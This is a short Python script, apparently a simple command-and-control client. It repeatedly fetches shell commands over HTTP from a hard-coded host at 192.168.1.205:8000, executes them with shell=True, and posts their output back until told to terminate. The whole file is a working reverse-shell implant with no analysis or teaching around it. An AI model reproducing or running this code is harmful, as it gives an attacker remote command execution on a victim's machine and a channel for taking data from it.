#!/usr/bin/env python3

import requests
import subprocess
import os

SERVER_IPADDR = "192.168.1.205"
PORT = "8000"
URL_STRING = "http://{}:{}".format(SERVER_IPADDR, PORT)

def web_client():
    while True:
        getResponse = requests.get(URL_STRING)
        evilCommand = getResponse.text

        if 'terminate' in evilCommand:
            break
        
        else:
            shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            postResponse = requests.post(URL_STRING,data=shellObject.stdout.read())
            postResponse = requests.post(URL_STRING,data=shellObject.stderr.read())

if __name__ == "__main__":
    web_client()